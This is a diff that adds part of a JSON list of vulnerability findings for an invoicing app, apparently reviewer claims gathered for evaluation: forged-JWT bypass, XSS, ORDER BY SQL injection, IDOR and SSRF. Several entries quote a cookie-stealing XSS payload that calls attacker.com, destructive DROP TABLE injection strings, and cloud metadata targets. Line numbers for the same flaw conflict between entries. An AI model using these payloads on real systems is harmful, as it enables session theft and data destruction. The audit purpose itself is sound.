+   "file": "lib/auth.js",
+   "line": "4",
+   "severity": "CRITICAL",
+   "impact": "An attacker can craft arbitrary JWT tokens with any claims (user ID, role, tenant) without a valid signature. The jwt.decode() function only decodes the payload without verification, allowing complete authentication bypass. Any attacker can impersonate any user.",
+   "evidence": "jwt.decode(bearer) is called without jwt.verify(). The function returns decoded claims without signature validation. Both currentUser() and tagRequest() use this vulnerable pattern."
+  },
+  {
+   "claim_id": "R52",
+   "title": "Cross-Site Scripting (XSS) in Invoice Notes",
+   "file": "lib/render.js",
+   "line": "3",
+   "severity": "HIGH",
+   "impact": "Attacker can inject malicious scripts that execute in the browser of anyone viewing the invoice, leading to session hijacking, credential theft, or malware distribution",
+   "evidence": "invoiceNote() function renders user-supplied note without HTML escaping: return `<div class=\"note\">${note}</div>`. Customer can include <script>alert('XSS')</script> or <img src=x onerror='fetch(\"http://attacker.com?cookie=\"+document.cookie)'> in invoice note. The same file shows proper pattern in customerName() which uses escapeHtml(name)."
+  },
+  {
+   "claim_id": "R53",
+   "title": "JWT Signature Not Verified - Authentication Bypass",
+   "file": "lib/auth.js",
+   "line": "5",
+   "severity": "CRITICAL",
+   "impact": "Complete authentication bypass; attacker can forge JWT tokens to impersonate any user including administrators",
+   "evidence": "currentUser() function uses jwt.decode(bearer) without signature verification. jwt.decode() only extracts the payload without validating the signature against a secret key. Any attacker can create a token with arbitrary claims (sub, role, tenant) and the application will accept it."
+  },
+  {
+   "claim_id": "R54",
+   "title": "Cross-Site Scripting (XSS) in invoiceNote function",
+   "file": "lib/render.js",
+   "line": "4",
+   "severity": "high",
+   "impact": "If invoiceNote() is called with user-controlled input, an attacker can inject arbitrary HTML and JavaScript. This could lead to: session hijacking via cookie theft, credential theft, malware distribution, or defacement of the invoice page.",
+   "evidence": "The invoiceNote() function at lines 4-6 takes a note parameter and directly embeds it in HTML without escaping: return `<div class=\"note\">${note}</div>;`. This function is exported (line 18) and could be called with user-supplied input."
+  },
+  {
+   "claim_id": "R55",
+   "title": "Missing Authentication Middleware Enforcement",
+   "file": "routes/invoices.js",
+   "line": "7",
+   "severity": "MEDIUM",
+   "impact": "Routes access req.user.id without explicit authentication middleware enforcement. If the middleware is misconfigured or missing, req.user could be undefined, causing requests to use NULL owner_id filters or behave unexpectedly. Additionally, the /invoices/:id endpoint has no owner check even with authentication.",
+   "evidence": "Routes like /receipts/:id (line 12), /invoices (line 19), /payments (line 27) all access req.user.id without a preceding middleware that validates the JWT and sets req.user. The currentUser() function can return {id: undefined} if no valid Bearer token is provided."
+  },
+  {
+   "claim_id": "R56",
+   "title": "SQL Injection in /invoices Route ORDER BY Clause",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "Critical",
+   "impact": "Complete database compromise - attacker can read, modify, or delete arbitrary data through SQL injection in the ORDER BY clause. Can lead to unauthorized data access, data destruction, and privilege escalation at the database level.",
+   "evidence": "Line 24: const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); User-supplied req.query.order parameter is directly concatenated into the SQL query without validation or parameterization. The same file correctly implements parameterized queries elsewhere (e.g., lines 8, 14-16) and uses a whitelist approach for /payments endpoint (lines 29-34), showing inconsistent security practices."
+  },
+  {
+   "claim_id": "R57",
+   "title": "Missing authorization check on /invoices/:id endpoint",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "critical",
+   "impact": "An authenticated attacker can access invoices belonging to other users by guessing or enumerating invoice IDs, leading to unauthorized disclosure of financial data",
+   "evidence": "Line 8-10: `const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice);` - No check for req.user.id or owner_id. Compare with /receipts/:id (line 15-16) which correctly includes `AND owner_id = $2` check. The endpoint trusts the id parameter without verifying ownership."
+  },
+  {
+   "claim_id": "R58",
+   "title": "Server-side request forgery (SSRF) in fetchLogo() with open redirects",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "high",
+   "impact": "An attacker can supply any URL. The server fetches it, enabling: (1) SSRF attacks against internal services (localhost, 169.254.169.254 for cloud metadata, internal IP ranges); (2) forced download of large files to exhaust bandwidth; (3) interaction with services that trust the server's IP; (4) open redirects where initial URL is internal but redirects to external attacker-controlled server. The fetched content is returned to the client after processing.",
+   "evidence": "Lines 5-8: async function fetchLogo(url) {\n  const response = await fetch(url, { redirect: 'follow' });\n  return Buffer.from(await response.arrayBuffer());\n}\nCalled from invoices.js line 38: const image = await fetchLogo(req.body.logoUrl);\nThe URL comes directly from req.body.logoUrl with no validation, and redirect: 'follow' allows following redirect chains."
+  },
+  {
+   "claim_id": "R59",
+   "title": "Cross-Site Scripting (XSS) in invoiceNote() Function",
+   "file": "lib/render.js",
+   "line": "4",
+   "severity": "Medium",
+   "impact": "If user-controlled data is passed to the invoiceNote() function and rendered in a web page, an attacker can inject malicious JavaScript code that executes in the victim's browser. This can lead to session hijacking, credential theft, malware distribution, or defacement. The function is exported and may be used by other components.",
+   "evidence": "Lines 4-6: function invoiceNote(note) { return `<div class=\"note\">${note}</div>`; }. The 'note' parameter is directly embedded in the HTML string without any escaping or sanitization. Any HTML/JavaScript in the note value will be interpreted by the browser. Contrast with customerName() function (lines 9-11) which correctly uses escapeHtml(name) to prevent this vulnerability. Example attack payload: <img src=x onerror=\"fetch('https://attacker.com?cookie='+document.cookie)\">"
+  },
+  {
+   "claim_id": "R60",
+   "title": "Cross-Site Scripting (XSS) via Unescaped HTML in Invoice Notes",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "High",
+   "impact": "Arbitrary JavaScript execution in user browsers. Attackers can steal session cookies, hijack user accounts, perform unauthorized actions on behalf of users, deface the invoice display, or redirect users to malicious sites. Affects all users viewing the invoice with the malicious note.",
+   "evidence": "Line 5: `return \\`<div class=\"note\">${note}</div>\\`;` embeds user input directly without HTML entity encoding. The module imports escape-html but fails to use it here. By contrast, customerName() on line 10 correctly uses escapeHtml(name), showing the correct pattern is available but not applied."
+  },
+  {
+   "claim_id": "R61",
+   "title": "Server-Side Request Forgery (SSRF) via Unvalidated HTTP Redirects",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "High",
+   "impact": "Ability to access internal services, cloud metadata endpoints, and private network resources by chaining HTTP redirects through attacker-controlled URLs",
+   "evidence": "Function fetchLogo() at line 6 uses fetch(url, { redirect: 'follow' }) allowing arbitrary redirect chains. Contrast: fetchAsset() at line 14 correctly uses { redirect: 'error' } to reject redirects. Attacker can POST logoUrl: 'https://attacker.com/step1' which redirects to 'http://localhost:6379' (Redis) or '169.254.169.254/latest/meta-data/' (AWS credentials)"
+  },
+  {
+   "claim_id": "R62",
+   "title": "SQL injection via ORDER BY parameter in GET /invoices",
+   "file": "routes/invoices.js",
+   "line": "20-23",
+   "severity": "high",
+   "impact": "An attacker can inject arbitrary SQL into the ORDER BY clause. Examples: '1 OR 1=1 --' changes the sort, 'CASE WHEN(1=1) THEN column ELSE 0 END' exfiltrates data via timing, 'column; DROP TABLE invoices; --' destroys data. Even with the WHERE clause scoped to owner_id, ORDER BY injection can read all columns and metadata.",
+   "evidence": "const order = req.query.order || 'created_at'; const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); \u2014 The order parameter is interpolated directly into the SQL template string (${order}) without parameterization or validation. Contrast with GET /payments on lines 27-28 which correctly uses a SORTABLE allowlist: const column = SORTABLE[req.query.sort] || SORTABLE.date;"
+  },
+  {
+   "claim_id": "R63",
+   "title": "JWT signature verification missing (authentication bypass)",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "critical",
+   "impact": "An attacker can forge arbitrary JWT tokens with any user ID or claims, completely bypassing authentication. All access controls depend on req.user.id being trustworthy.",
+   "evidence": "Lines 4-8: `function currentUser(req) { const bearer = (req.headers.authorization || '').replace('Bearer ', ''); const claims = jwt.decode(bearer); return { id: claims && claims.sub, role: claims && claims.role }; }` - The jwt.decode() function decodes without signature verification. This is different from jwt.verify() which checks the signature. An attacker can create a valid-looking JWT with any payload and the server will trust it."
+  },
+  {
+   "claim_id": "R64",
+   "title": "JWT tokens accepted without signature verification",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "critical",
+   "impact": "An attacker can forge JWT tokens with any claims (e.g., setting role to 'admin' or any user's id) and the application will trust them without validation. This bypasses authentication entirely since currentUser() supplies the identity for protected endpoints like /invoices and /receipts.",
+   "evidence": "Line 6: `const claims = jwt.decode(bearer);` uses jwt.decode() which does not verify the signature. Line 12 in tagRequest function repeats this pattern without verification."
+  },
+  {
+   "claim_id": "R65",
+   "title": "JWT Signature Verification Bypassed",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "critical",
+   "impact": "An attacker can forge a JWT with any claims (user ID, role) by creating a token with alg: 'none' or signing with any key. The server will accept it, allowing impersonation of any user and privilege escalation. This is a critical authentication bypass.",
+   "evidence": "function currentUser(req) { const bearer = (req.headers.authorization || '').replace('Bearer ', ''); const claims = jwt.decode(bearer); return { id: claims && claims.sub, role: claims && claims.role }; } Both currentUser (line 6) and tagRequest (line 12) use jwt.decode() instead of jwt.verify(). jwt.decode() extracts claims without cryptographic verification."
+  },
+  {
+   "claim_id": "R66",
+   "title": "SSRF in POST /branding/preview \u2014 unrestricted URL fetch",
+   "file": "routes/invoices.js",
+   "line": "35 + lib/remote.js:6-9",
+   "severity": "high",
+   "impact": "An attacker can make the server fetch arbitrary URLs, reaching internal services and metadata endpoints. Examples: http://127.0.0.1:6379 (Redis), http://169.254.169.254/latest/meta-data (AWS metadata), http://internal.example.com/admin, file:// URLs. Redirects are enabled (redirect: 'follow'), so an attacker can redirect from an external domain to an internal one. The fetched data is returned as a PNG image buffer, but timing and response size can leak information.",
+   "evidence": "POST /branding/preview calls const image = await fetchLogo(req.body.logoUrl); which passes the URL to: async function fetchLogo(url) { const response = await fetch(url, { redirect: 'follow' }); return Buffer.from(await response.arrayBuffer()); } \u2014 No URL validation, no allowlist, no hostname check. Contrast with fetchAsset() on lines 11-15 which correctly validates: const parsed = new URL(url); if (!ALLOWED.has(parsed.hostname)) throw new Error('host not allowed');"
+  },
+  {
+   "claim_id": "R67",
+   "title": "Missing Authorization on Invoice Detail Endpoint",
+   "file": "routes/invoices.js",
+   "line": "6",
+   "severity": "HIGH",
+   "impact": "Unauthenticated users or users without the invoice ID can access any invoice by guessing numeric IDs, leading to information disclosure of confidential financial data",
+   "evidence": "GET /invoices/:id endpoint does not verify ownership: const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]). There is no check that invoice belongs to current user. Contrast with GET /receipts/:id which correctly checks ownership: WHERE id = $1 AND owner_id = $2 with req.user.id parameter."
+  },
+  {
+   "claim_id": "R68",
+   "title": "JWT Verification Bypass - Unverified Token Decoding",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "Critical",
+   "impact": "Complete authentication bypass allowing attackers to forge JWT tokens and impersonate any user, accessing all protected endpoints and user data without valid credentials",
+   "evidence": "Function currentUser() uses jwt.decode() instead of jwt.verify(). The decode function only parses JWT content without validating the signature, allowing any attacker to create a valid-looking token claiming to be any user with any role. Same issue on line 12 in tagRequest()."
+  },
+  {
+   "claim_id": "R69",
+   "title": "SSRF Vulnerability in Logo Fetching via Unvalidated Redirects",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "HIGH",
+   "impact": "An attacker can trick the server into making requests to internal services (localhost, private IPs, cloud metadata endpoints) by providing a URL that redirects to those targets.",
+   "evidence": "Line 5: 'async function fetchLogo(url) { const response = await fetch(url, { redirect: \\'follow\\' });' - the redirect option is set to \\'follow\\', allowing the server to follow redirects to arbitrary hosts. The URL is taken directly from req.body.logoUrl without hostname validation."
+  },
+  {
+   "claim_id": "R70",
+   "title": "Reflected XSS in Invoice Note Rendering",
+   "file": "lib/render.js",
+   "line": "5",
+   "severity": "HIGH",
+   "impact": "The invoiceNote() function directly embeds user-provided note text into HTML without escaping, causing stored/reflected XSS. An attacker can inject JavaScript code that executes in the context of users viewing the invoice, stealing cookies, session tokens, or performing actions on their behalf.",
+   "evidence": "function invoiceNote(note) { return `<div class=\"note\">${note}</div>`; } at line 5. The note parameter is directly interpolated into the HTML template without using escapeHtml() (which is available as seen in customerName()). This allows injection of <script> tags and event handlers like onload."
+  },
+  {
+   "claim_id": "R71",
+   "title": "Broken object-level authorization: /invoices/:id returns data for any user",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "high",
+   "impact": "An authenticated attacker can view invoices belonging to other users by iterating through invoice IDs. If invoice IDs are sequential or predictable, this is trivial enumeration. The attacker learns financial details of all customers.",
+   "evidence": "Lines 7-10: router.get('/invoices/:id', async (req, res) => {\n  const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);\n  res.json(invoice);\n});\nThe query filters only by invoice id, not by owner. Contrast with line 14-17 (/receipts/:id) which includes AND owner_id = $2."
+  },
+  {
+   "claim_id": "R72",
+   "title": "Missing Authorization Check in /invoices/:id Endpoint",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "high",
+   "impact": "An authenticated user can read any invoice in the system by enumerating invoice IDs. If invoices contain financial or personal information, this is a serious data breach.",
+   "evidence": "router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice); }); The query filters only by id, with no check that the invoice belongs to the authenticated user. Compare: /receipts/:id (line 15) filters by id AND owner_id; /payments (line 32) filters by WHERE owner_id = $1."
+  },
+  {
+   "claim_id": "R73",
+   "title": "Missing authorization check on GET /invoices/:id (BOLA/IDOR)",
+   "file": "routes/invoices.js",
+   "line": "7",
+   "severity": "critical",
+   "impact": "Broken Object-Level Authorization (BOLA/IDOR): Any authenticated user can read any invoice by guessing or enumerating invoice IDs. This exposes potentially sensitive financial data of other customers.",
+   "evidence": "Line 7-9 retrieves an invoice by ID without checking ownership: router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice); }). This contrasts sharply with the /receipts/:id endpoint (line 13-18) which correctly includes AND owner_id = $2 check."
+  },
+  {
+   "claim_id": "R74",
+   "title": "Cross-Site Scripting (XSS) in Invoice Note Rendering",
+   "file": "lib/render.js",
+   "line": "4",
+   "severity": "HIGH",
+   "impact": "User-controlled invoice notes are directly embedded into HTML without escaping. An attacker can inject malicious JavaScript that executes in the victim's browser when viewing the invoice, potentially stealing session cookies, performing unauthorized actions, or defacing the page.",
+   "evidence": "invoiceNote() function at line 4 returns `<div class=\"note\">${note}</div>` without calling escapeHtml(note). The note parameter comes directly from user input. Compare with customerName() on line 8 which correctly uses escapeHtml()."
+  },
+  {
+   "claim_id": "R75",
+   "title": "Server-Side Request Forgery (SSRF) in Logo Fetching",
+   "file": "lib/remote.js",
+   "line": "5",
+   "severity": "High",
+   "impact": "SSRF allows attackers to make the server perform requests to arbitrary URLs, potentially accessing internal services, cloud metadata endpoints, or local network resources. This enables port scanning, credential theft (via cloud metadata), and lateral movement in internal networks.",
+   "evidence": "The fetchLogo(url) function at lines 5-8 accepts any URL parameter without validation and uses fetch() with redirect: 'follow', enabling redirect chains. No hostname validation or whitelist is applied, unlike the fetchAsset() function below it which correctly includes a whitelist check. The function is called from /branding/preview POST endpoint at line 38 of routes/invoices.js, allowing direct attacker control via req.body.logoUrl."
+  },
+  {
+   "claim_id": "R76",
+   "title": "JWT Token Verification Bypassed via jwt.decode()",
+   "file": "lib/auth.js",
+   "line": "4",
+   "severity": "CRITICAL",
+   "impact": "An attacker can forge JWT tokens and impersonate any user, including those with elevated privileges. The jwt.decode() function decodes without signature verification.",
+   "evidence": "Line 4: 'const claims = jwt.decode(bearer);' does not pass a secret parameter. Line 10 has the same issue. The function should use jwt.verify(token, secret) instead."
+  },
+  {
+   "claim_id": "R77",
+   "title": "SQL Injection via ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "16",
+   "severity": "CRITICAL",
+   "impact": "The 'order' query parameter is directly interpolated into the SQL query without parameterization or validation. An attacker can inject arbitrary SQL code by crafting a malicious 'order' parameter, allowing data exfiltration, modification, or deletion from the database.",
+   "evidence": "Line 16: const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, ...). The 'order' variable comes from req.query.order with only a default fallback. Contrast with /payments endpoint (line 23) which uses an explicit whitelist SORTABLE[req.query.sort]."
+  },
+  {
+   "claim_id": "R78",
+   "title": "Missing Authorization Check in GET /invoices/:id Endpoint",
+   "file": "routes/invoices.js",
+   "line": "8",
+   "severity": "High",
+   "impact": "An attacker can retrieve invoices belonging to any user by simply changing the invoice ID in the URL. There is no verification that the requesting user is the owner of the invoice. Combined with the JWT forgery vulnerability (F-002), this allows complete unauthorized access to all invoice data in the system. This is a critical data exposure vulnerability.",
+   "evidence": "Lines 7-10: router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice); }). The query only checks invoice ID, with no owner_id filter. Compare with the /receipts/:id endpoint (lines 13-19) which correctly includes: WHERE id = $1 AND owner_id = $2 with [req.params.id, req.user.id]. An attacker can request GET /invoices/1, GET /invoices/2, etc., and retrieve all invoices regardless of ownership."
+  },
+  {
+   "claim_id": "R79",
+   "title": "JWT Verification Bypass - Unverified Token Decoding",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "Critical",
+   "impact": "Complete authentication bypass. Attacker can forge JWT tokens with arbitrary claims (user ID, admin role, tenant ID) without any signature verification. Enables unauthorized access to all protected endpoints, privilege escalation to admin, cross-tenant data access, and full account takeover. Multiple occurrences on lines 6 and 12.",
+   "evidence": "Line 6: `const claims = jwt.decode(bearer);` uses jwt.decode() which only decodes the payload without signature verification. Line 12 contains identical vulnerable pattern. Should use jwt.verify(bearer, secret) instead. The jsonwebtoken library is available but the wrong function is called. Attacker can create unsigned JWT with any claims."
+  },
+  {
+   "claim_id": "R80",
+   "title": "JWT decoded without verification allows authentication bypass",
+   "file": "lib/auth.js",
+   "line": "lib/auth.js:12",
+   "severity": "critical",
+   "impact": "An attacker can assume any user's identity and role, accessing any resource the application exposes.",
+   "evidence": "Lines 6 and 12 use `jwt.decode(bearer)` without calling `jwt.verify()`. Any attacker can forge a JWT with arbitrary claims (sub, role, tenant) and bypass authentication."
+  },
+  {
+   "claim_id": "R81",
+   "title": "SQL Injection in Invoice Query - Unparameterized ORDER BY Clause",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "Critical",
+   "impact": "Allows arbitrary SQL injection through the order parameter, enabling time-based data exfiltration, table modification/deletion, and potential full database compromise via blind SQL injection techniques",
+   "evidence": "The GET /invoices endpoint constructs SQL with direct string interpolation: SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order} where order comes from req.query.order without validation. An attacker can inject SQL after ORDER BY, such as: ?order=created_at;DROP TABLE invoices;-- or use CASE statements for blind injection."
+  },
+  {
+   "claim_id": "R82",
+   "title": "Missing Authentication on /branding/preview Endpoint",
+   "file": "routes/invoices.js",
+   "line": "46",
+   "severity": "MEDIUM",
+   "impact": "An unauthenticated attacker can access the /branding/preview endpoint, triggering logo fetches on demand. This can be used to probe internal services or amplify SSRF attacks.",
+   "evidence": "Line 46: 'router.post(\\'/branding/preview\\', async (req, res) => { const image = await fetchLogo(req.body.logoUrl);' - no middleware or authentication check is present before this handler. The endpoint accepts any request."
+  },
+  {
+   "claim_id": "R83",
+   "title": "JWT tokens decoded without signature verification (token forgery)",
+   "file": "lib/auth.js",
+   "line": "6",
+   "severity": "critical",
+   "impact": "An attacker can forge JWT tokens with any claims (including admin roles) without knowing the signing secret, leading to authentication bypass and privilege escalation.",
+   "evidence": "Line 6 uses jwt.decode(bearer) without calling jwt.verify(). The function does not pass a secret key for verification, allowing any attacker to forge tokens with arbitrary claims."
+  },
+  {
+   "claim_id": "R84",
+   "title": "SQL Injection in /invoices Endpoint via order Parameter",
+   "file": "routes/invoices.js",
+   "line": "20",
+   "severity": "CRITICAL",
+   "impact": "An attacker can execute arbitrary SQL queries by manipulating the 'order' query parameter, allowing database exfiltration, modification, or deletion.",
+   "evidence": "Line 20: 'const order = req.query.order || \\'created_at\\'; ... ORDER BY ${order}' - the order parameter is directly interpolated into the SQL query without any sanitization or parameterization."
+  },
+  {
+   "claim_id": "R85",
+   "title": "SQL Injection via ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "17",
+   "severity": "CRITICAL",
+   "impact": "Attacker can execute arbitrary SQL commands, leading to data exfiltration, modification, deletion, or database compromise",
+   "evidence": "GET /invoices endpoint takes req.query.order parameter and directly interpolates it into SQL query: `SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`. The order parameter is never validated. Attacker can inject SQL by calling /invoices?order=created_at;DROP TABLE invoices;--"
+  },
+  {
+   "claim_id": "R86",
+   "title": "BOLA/IDOR on GET /invoices/:id \u2014 no ownership verification",
+   "file": "routes/invoices.js",
+   "line": "7-9",
+   "severity": "high",
+   "impact": "Any authenticated user can retrieve any invoice by guessing or enumerating invoice IDs. Invoices contain sensitive financial data (lines 21, 28 show they are user-scoped in other endpoints). An attacker can read all invoices in the system.",
+   "evidence": "router.get('/invoices/:id', async (req, res) => { const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]); res.json(invoice); }); \u2014 Contrast with lines 14-17 where GET /receipts/:id correctly filters by owner_id: 'SELECT * FROM receipts WHERE id = $1 AND owner_id = $2', [req.params.id, req.user.id]. The /invoices endpoint omits the ownership check."
+  },
+  {
+   "claim_id": "R87",
+   "title": "SQL Injection in GET /invoices Endpoint",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "High",
+   "impact": "An attacker can inject arbitrary SQL code through the 'order' query parameter, potentially leading to unauthorized data access, modification, deletion, or database corruption. The attacker can bypass access controls and compromise data integrity.",
+   "evidence": "Line 24: const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); The 'order' variable is derived from req.query.order without validation and directly interpolated into the SQL query string. Example malicious input: ?order=id;DELETE FROM invoices;--"
+  },
+  {
+   "claim_id": "R88",
+   "title": "Server-Side Request Forgery (SSRF) via Redirect in fetchLogo",
+   "file": "lib/remote.js",
+   "line": "6",
+   "severity": "MEDIUM",
+   "impact": "An attacker-controlled logoUrl can redirect to internal services (localhost, internal IPs) or sensitive endpoints, leading to SSRF attacks",
+   "evidence": "const response = await fetch(url, { redirect: 'follow' }); - allows the server to follow redirects to any destination including internal services"
+  },
+  {
+   "claim_id": "R89",
+   "title": "SQL injection via unsanitized ORDER BY parameter",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "critical",
+   "impact": "An attacker can execute arbitrary SQL, reading, modifying or deleting data, or executing commands on the database server depending on its configuration.",
+   "evidence": "Line 24: `const order = req.query.order || 'created_at'; ... ORDER BY ${order}`. The `order` parameter is user-supplied and directly interpolated into the SQL query string. An attacker can inject arbitrary SQL, e.g., `?order=created_at; DROP TABLE invoices;--`."
+  },
+  {
+   "claim_id": "R90",
+   "title": "SQL Injection via Unsanitized ORDER BY Parameter",
+   "file": "routes/invoices.js",
+   "line": "24",
+   "severity": "high",
+   "impact": "An attacker can inject arbitrary SQL expressions into the ORDER BY clause, potentially exfiltrating data, bypassing filters, or causing denial of service.",
+   "evidence": "const order = req.query.order || 'created_at'; const rows = await db.query(`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}`, [req.user.id]); The order variable is interpolated directly into SQL without validation."
+  },
+  {
+   "claim_id": "R91",
+   "title": "Weak JWT Parsing Allows Null User Context",
+   "file": "lib/auth.js",
+   "line": "4",
+   "severity": "MEDIUM",
+   "impact": "When jwt.decode() fails (no Bearer token, invalid format), currentUser() returns { id: undefined, role: undefined }. This falsy user object may bypass authorization checks in downstream code if developers use if(req.user) instead of if(req.user?.id). The /receipts/:id endpoint checks owner_id but /invoices/:id endpoint trusts req.user.id being set.",
+   "evidence": "const claims = jwt.decode(bearer); return { id: claims && claims.sub, role: claims && claims.role }; at lines 5-6. When bearer token is empty or invalid, claims is null/undefined, resulting in { id: undefined, role: undefined }. This passes falsy checks but may not stop queries if not properly validated."
+  }
+ ]
+}
